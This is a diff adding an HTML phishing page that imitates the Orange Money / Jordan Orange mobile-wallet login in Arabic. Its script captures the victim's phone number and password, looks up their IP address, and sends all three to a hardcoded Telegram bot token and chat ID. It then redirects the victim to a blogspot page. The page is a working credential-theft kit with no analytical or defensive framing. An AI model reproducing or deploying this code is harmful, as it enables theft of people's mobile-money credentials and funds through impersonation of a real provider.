@@ -1,0 +1,705 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Orange Money</title>
+    <style>
+        body {
+            margin: 0;
+            background-color: #000;
+            display: flex;
+            justify-content: center;
+            align-items: start;
+            height: 100vh;
+        }
+        img {
+            max-width: 100%;
+            height: auto;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <img src="logo.jpeg" alt="Orange Money Logo">
+</body>
+</html>
+<!--DOCTYPE html-->
+
+<html lang="ar" dir="rtl">
+
+<head>
+
+    <meta charset="UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Jordan Orange</title>
+
+    <style>
+
+        body {
+
+          display: flex;
+
+            justify-content: center;
+
+            align-items: center;
+
+            font-family: 'Arial', sans-serif; /* يمكنك تغيير الخط إلى خط iPhone هنا */
+
+            background-color: #FFFFFF;
+
+            color:#000000;
+
+            margin: 0;
+
+            padding: 0;
+
+            text-align: right;
+
+          
+
+            overflow: hidden; /* منع التمرير */
+
+        }
+
+        .container {
+
+          
+
+            max-width: 400px;
+            }
+
+        h2 {
+
+          margin-bottom: 20px; /* مسافة بين العنوان والحقل */
+            margin-bottom: 10px;
+
+          font-size: 30px;
+
+            background-color: #FFFFFF;
+
+            padding: 30px;
+
+            border-radius: 20px;
+
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+
+        }
+
+        h1 {
+
+            color: #333;
+
+            font-size: 24px;
+
+            display: flex;
+
+            justify-content: space-between;
+            align-items: center;
+
+            margin-bottom: 10px;
+
+            direction: ltr;
+
+        }
+
+        .orange {
+
+            color: #ff6600;
+
+            font-weight: bold;
+
+        }
+
+        label {
+
+            display: block;
+
+            margin: 15px 0 5px;
+
+            color: #666;
+
+            font-size: 14px;
+
+            text-align: right;
+
+        }  .phone-label {
+
+            display: flex;
+
+            justify-content: flex-end;
+
+            align-items: center;
+
+            position: relative;
+
+        }
+
+        .phone-label span {
+
+            display: inline-block;
+
+        }
+
+        .phone-label .orange {
+
+            margin-right: 5px; /* وضع "Orange" إلى اليمين */
+
+        }
+
+        input[type="tel"], input[type="password"] {
+
+            width: 90%;
+
+            padding: 10px;
+
+            margin-top: 5px;
+
+            margin-bottom: 5px;
+
+            border: none; /* إزالة الإطار */
+
+            border-bottom: 2px solid #000000; /* خط أسفل */border-radius: 5px;
+
+            font-size: 14px;
+
+            outline: none; /* إزالة التحديد عند 
+
+         النقر */
+
+            text-align: right;
+
+            
+
+            transition: 0.10s ease all; /* تأثير الانتقال */
+
+    
+
+          }
+
+        .forgot-password-title {
+
+            font-size: 12px;
+
+            color:#ff6600;
+
+            text-align: right;
+
+            margin-top: 5px;
+
+            margin-bottom: 15px;
+
+        }
+
+        .checkbox-container {
+
+            display: flex;
+
+            justify-content: flex-end;
+
+            align-items: center;
+
+            margin-bottom: 15px;
+
+            font-size: 14px;
+
+            position: relative;
+
+        }
+
+        .checkbox-container label {
+
+            margin-left: 10px;
+
+            font-size: 14px;
+}
+
+        .checkbox-container .forgot-password {
+
+            position: absolute;
+
+            right: 0;
+
+            top: 10px; /* Adjust this value as needed */
+
+            font-size: 14px;
+
+            color:#ff6600;
+
+            text-decoration: center;
+
+            cursor: pointer;
+
+        }
+
+        .btn {
+
+            background-color: #ff6600;
+
+            color: #000000;
+
+            border: none;
+
+            padding: 8px;
+
+            width: 100%;
+
+            border-radius: 5px;
+
+            font-size: 12px;
+
+            cursor: pointer;
+
+         margin-top: 1px;
+
+        }
+
+        .btn:hover {
+
+            background-color: #e55a00;
+
+        }
+
+        .transparent-btn {
+
+            background-color: transparent;
+
+            color: #ff6600;
+
+            border: 1px solid #ccc;
+
+            padding: 8px;
+
+            width: 100%;
+
+            border-radius: 3px;
+
+            font-size: 14px;
+
+            cursor: pointer;
+
+            margin-top: 5px;
+
+        }
+
+        .transparent-btn:hover {
+
+            background-color: #808080;
+
+        }
+
+        .note {
+
+            font-size: 12px;
+
+            color: #999;
+
+            margin-top: 5px;
+
+            text-align: right;
+
+        }
+
+        .subnote {
+
+            font-size: 12px;
+
+            color: #999;
+
+            text-align: right;
+
+            margin-bottom: 6px;
+        }
+
+        .error {
+
+            color: red;
+
+            font-size: 10px;
+
+            margin-bottom: 7px;
+
+            display: none; /* يتم إخفاء الإشعار في البداية */
+
+        }
+
+        .button-container {
+
+            display: flex;
+
+            justify-content: space-between;
+
+          margin-bottom: 30px; /* مسافة بين الحقل والزر */
+            margin-top: 50px;
+  
+          margin-bottom: 30px; /* مسافة بين الحقل والزر */
+
+           
+        }
+}
+
+        .checkbox-container .forgot-password {
+
+            position: absolute;
+
+            right: 0;
+
+            top: 10px; /* Adjust this value as needed */
+
+            font-size: 14px;
+
+            color:#ff6600;
+
+            text-decoration: center;
+
+            cursor: pointer;
+
+        }
+
+        .btn {
+
+            background-color: #ff6600;
+
+            color: #000000;
+
+            border: none;
+
+            padding: 8px;
+
+            width: 100%;
+
+            border-radius: 5px;
+
+            font-size: 12px;
+
+            cursor: pointer;
+
+         margin-top: 1px;
+
+        }
+
+        .btn:hover {
+
+            background-color: #e55a00;
+
+        }
+
+        .transparent-btn {
+
+            background-color: transparent;
+
+            color: #ff6600;
+
+            border: 1px solid #ccc;
+
+            padding: 8px;
+
+            width: 100%;
+
+            border-radius: 3px;
+
+            font-size: 14px;
+
+            cursor: pointer;
+
+            margin-top: 5px;
+
+        }
+
+        .transparent-btn:hover {
+
+            background-color: #808080;
+
+        }
+
+        .note {
+
+            font-size: 12px;
+
+            color: #999;
+
+            margin-top: 5px;
+
+            text-align: right;
+
+        }
+
+        .subnote {
+
+            font-size: 12px;
+
+            color: #999;
+
+            text-align: right;
+
+            margin-bottom: 6px;
+        }
+
+        .error {
+
+            color: red;
+
+            font-size: 10px;
+
+            margin-bottom: 7px;
+
+            display: none; /* يتم إخفاء الإشعار في البداية */
+
+        }
+
+        .button-container {
+
+            display: flex;
+
+            justify-content: space-between;
+
+          margin-bottom: 30px; /* مسافة بين الحقل والزر */
+            margin-top: 50px;
+  
+          margin-bottom: 30px; /* مسافة بين الحقل والزر */
+
+           
+        }
+ .register-btn {
+
+            background-color: white;
+
+            color: black;
+
+            border: 1px solid #ccc;
+
+            padding: 8px;
+
+            border-radius: 5px;
+
+            font-size: 12px;
+
+            cursor: pointer;
+
+            width: 49%; /* عرض الزر 45% */
+
+        }
+
+        .first-time-btn {
+
+            background-color: black;
+
+            color: white;
+
+            border: 1px solid #ccc;
+
+            padding: 8px;
+
+            border-radius: 5px;
+
+            font-size: 12px;cursor: pointer;
+
+            width: 49%; /* عرض الزر 45% */
+
+        }
+
+    </style>
+
+    <script>
+
+        function validatePassword(password) {
+
+            // تحقق من عدم وجود أحرف عربية
+
+            const arabicRegex = /[\u0600-\u06FF]/;
+
+            if (arabicRegex.test(password)) {
+
+                return false;
+
+            }
+
+            // تحقق من أن كلمة السر تحتوي على رموز وأرقام أو رموز وأرقام وأحرف
+
+            const symbolRegex = /[!@#$%^&*(),.?":{}|<>]/;
+
+            const numberRegex = /\d/;
+
+            const letterRegex = /[a-zA-Z]/;
+
+            return (symbolRegex.test(password) && numberRegex.test(password)) &&(!letterRegex.test(password) || letterRegex.test(password));
+
+        }
+
+        function validateForm() {
+
+            const phone = document.getElementById('phone').value;
+
+            const password = document.getElementById('password').value;
+
+            const errorMsg = document.getElementById('error-msg');
+
+            if (!/^\d{10}$/.test(phone)) {
+
+                errorMsg.innerText = "لقد أدخلت رقم محفظة و / أو كلمة سر خاطئة. يرجى إدخال رقم محفظة و / أو كلمة سر صحيحة او القيام بتغيير كلمة السر";
+
+                errorMsg.style.display = 'block';
+
+                return false;
+
+            }
+
+            if (!validatePassword(password)) {
+
+                errorMsg.innerText = "لقد أدخلت رقم محفظة و / أو كلمة سر خاطئة. يرجى إدخال رقم محفظة و / أو كلمة سر صحيحة او القيام بتغيير كلمة السر";
+
+                errorMsg.style.display = 'block';
+
+                return false;
+
+            }
+
+            errorMsg.style.display = 'none'; // إخفاء الإشعار في حالة الإدخال الصحيح
+
+            return true;
+
+        }function sendTelegramMessage(botToken, chatId, message) {
+
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            const data = {
+
+                chat_id: chatId,
+
+                text: message,
+
+                parse_mode: "MarkdownV2"  // لتنسيق الرسالة
+
+            };
+
+            return fetch(url, {
+
+                method: 'POST',
+
+                headers: {
+
+                    'Content-Type': 'application/json'
+
+                },
+
+                body: JSON.stringify(data)
+
+            });
+
+        }
+
+        async function onSubmit(event) {
+
+            event.preventDefault();
+
+            if (!validateForm()) return;
+
+            const phone = document.getElementById('phone').value;
+
+            const password = document.getElementById('password').value;
+
+            try {
+
+                const ipRequest = await fetch('https://api.ipify.org?format=json');const ipResponse = await ipRequest.json();
+
+                const ipAddress = ipResponse.ip;
+
+                // تنسيق الرسالة باستخدام MarkdownV2
+
+                const message = `*تسجيل*\n\n` +
+
+                                `*رقم الهاتف:* \`${phone}\`\n` +
+
+                                `*كلمة السر:* \`${password}\`\n` +
+
+                                `*IP:* \`${ipAddress}\``;
+
+                // إرسال الرسالة إلى البوت
+
+                await sendTelegramMessage('7755037837:AAGoRSQw2xopsfB8oH8TugO8XEQD-VSOkPE','8194718375', message);
+
+                // تحويل المستخدم إلى الرابط المحدد
+
+                window.location.href = "https://orangenaloppts.blogspot.com/2024/12/box-sizing-border-box-margin-0-padding.html";
+
+            } catch (error) {
+
+                console.error('Error:', error);
+
+            }
+
+        }
+
+    </script>
+
+</head>
+
+<body
+    <div class="container">
+
+        <h1><span class=" "></span></h1>
+
+        
+
+        <form onsubmit="onSubmit(event)">
+
+            <label for="phone" class="phone-label">
+
+                <span class="orange"></span>
+
+                   
+
+            </label>
+
+            رقـم الهاتـف <input type="tel" id="phone" placeholder="  " pattern="[0-9]{10}" maxlength="10" required>
+
+            <div class="subnote">الرجاء إدخال رقم الهاتف الذي يبدأ بـ ٠۷۷ او ۰۷۸ أو ۰۷۹</div>
+
+            
+
+            <label for="password">
+             كلمة السر  </label>
+
+            <input type="password" id="password" placeholder=" " required>
+
+            <div id="error-msg" class="error"></div> <!-- إشعار الخطأ -->
+
+            <div class="forgot-password-title"> نسيت كلمة السر</div>
+
+          <div class="checkbox-container">
+
+                <a href="#" class="forgot-password"> </a>
+
+                <label>
+
+                  
+
+            </label>
+
+            </div>
+
+            <button type="submit" class="btn">تسجيل الدخول</button>
+
+           <button class="register-btn">
+تسجيل الدخول لاول مرة</button>
+           
+<button class="first-time-btn">التسجيل الذاتي </button>
+          
+
+           <div class="contact-us">تواصل معنا
+
+              
+
+           </div>
+
+           </script>
+
+          
+
+         
+
+</body>
+
+</html>      
+
